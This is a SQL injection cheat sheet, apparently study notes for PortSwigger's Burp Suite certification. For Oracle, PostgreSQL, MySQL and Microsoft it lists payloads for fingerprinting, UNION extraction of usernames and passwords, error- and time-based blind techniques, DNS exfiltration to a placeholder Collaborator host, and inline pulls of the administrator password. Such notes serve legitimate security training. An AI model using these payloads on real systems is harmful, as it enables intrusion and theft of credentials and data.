##### PortSwigger BurpSuite Certification Summary
# SQL Injection
### Determine the Database
```
SELECT @@version # fails. Then you know it is not MS SQL or MySQL.
SELECT version() # fails. You know it is not PostGres
SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;# Succeeds! You know it is oracle.
```
Oracle always requires a `FROM` statement with every `SELECT`. To query arbitrary data (such as strings), the `dual` table should be used, e.g.:
```
SELECT 'A','B' FROM dual
```

### String Concatenation
In order to get multiple results in one column.
```
Oracle,PostgreSQL			'foo'||'bar'
Microsoft					'foo'+'bar'
MySQL						'foo' 'bar' or CONCAT('foo','bar')
```

### Comments
```
Oracle  					--comment
Microsoft,PostgreSQL		--comment or /*comment*/
MySQL						#comment or -- comment or /*comment*/				
```

### Substring
Syntax: SUBSTRING(string, start_position, length)
```
Oracle						SUBSTR('foobar',4,2)
All others					SUBSTRING('foobar',4,2)
```

### Length
All databases have a function for string length: `LENGTH()`

### List Tables & Columns
```
Oracle 				 	SELECT * FROM all_tables
						SELECT * FROM all_tab_columns WHERE table_name=''

All others		  		SELECT * FROM information_schema.tables
						SELECT * FROM information_schema.columns WHERE table_name = ''
```

### UNION Attack
Determine the number of columns:
```
UNION SELECT NULL
...
UNION SELECT NULL, ..., NULL
```
or
```
ODER BY 1
...
ORDER BY 10
```

Check which columns are formatted as string by replacing any `NULL` with `'A'`.

Use UNION to query information from other tables:
```
UNION SELECT username, password FROM users
```

### Conditional Errors
```
Oracle 		SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual
Microsoft	SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END
PostgreSQL	SELECT CASE WHEN (1=1) THEN cast(1/0 as text) ELSE NULL END
MySQL		SELECT IF(1=1, SELECT table_name FROM information_schema.tables, 'a')
```

MySQL IF() syntax: SELECT IF(condition, case_true, case_false)

### Time Delays
Sleep for 10 seconds.
```
Oracle	  	dbms_pipe.receive_message(('a'),10)
Microsoft  	WAITFOR DELAY '0:0:10'
PostgreSQL  	SELECT pg_sleep(10)
MySQL		SELECT sleep(10)
```
In Oracle, a concatenation of strings is required for a conditional time delay:

`SELECT CASE WHEN (1=1) THEN
'A'||dbms_pipe.receive_message(('A'),10) ELSE NULL END FROM dual`

### DNS Lookup
Oracle
```
SELECT extractvalue(xmltype(
	'<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE root [ <!ENTITY % remote SYSTEM
	"http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l')
FROM dual
```
PostgreSQL
```
copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'
```
MySQL
```
LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'
```

Prepending any query result to the subdomain, separated with a `.`, allows for sending information to the adversary.

Note:
* The Oracle statement works only on unpatched versions.
* The MySQL statement is only working on Windows machines

### Inline Commands
#### Oracle, PostgreSQL
```
'||(select password from users where username='administrator')||'
```
#### MySQL
```
' (select password from users where username='administrator') '
```
#### Microsoft
```
'+(select password from users where username='administrator')+'
```